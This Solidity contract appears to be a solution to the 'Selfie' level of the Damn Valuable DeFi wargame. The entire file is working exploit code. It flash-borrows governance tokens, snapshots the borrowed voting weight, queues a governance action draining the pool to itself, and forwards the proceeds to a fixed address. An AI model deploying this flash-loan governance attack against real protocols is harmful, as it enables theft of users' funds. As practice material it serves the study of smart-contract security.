// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./DamnValuableTokenSnapshot.sol";

contract Level06Attack {

    address selfiePool = 0xbF88E4ce1EB3Fd0B69A07F2be29Bb78526C24183;
    address governor = 0xa4D6DCE5360832875Cf958af3009Ae173dAfe130;
    DamnValuableTokenSnapshot dvts = DamnValuableTokenSnapshot(0xF6d352F090960A4075BFC29D20B4Cf01F14B4257);

    // Withdraw my 'winnings'
    function transferWinnings() public {
        require(dvts.transfer(0x33651c5492a5353e78d6ADA9EB025c9DdE18F4d2, dvts.balanceOf(address(this))));
    }

    // takes the flashloan, then queues the drain funds function.
    // Call the drain funds after two days manually via script
    function callLoanAndQueue() external {
        selfiePool.call(abi.encodeWithSignature("flashLoan(uint256)", 1000001 ether));
        bytes memory _calldata = abi.encodeWithSignature("drainAllFunds(address)", address(this));
        governor.call(abi.encodeWithSignature("queueAction(address,bytes,uint256)", selfiePool, _calldata, 0));
    }

    // Calls snapshot so that my outsized voting weight is kep, then sends the tokens back to repay the loan.
    function receiveTokens(address _token, uint256 _amount) external {
        dvts.snapshot();
        require(dvts.transfer(selfiePool, _amount));
    }
}
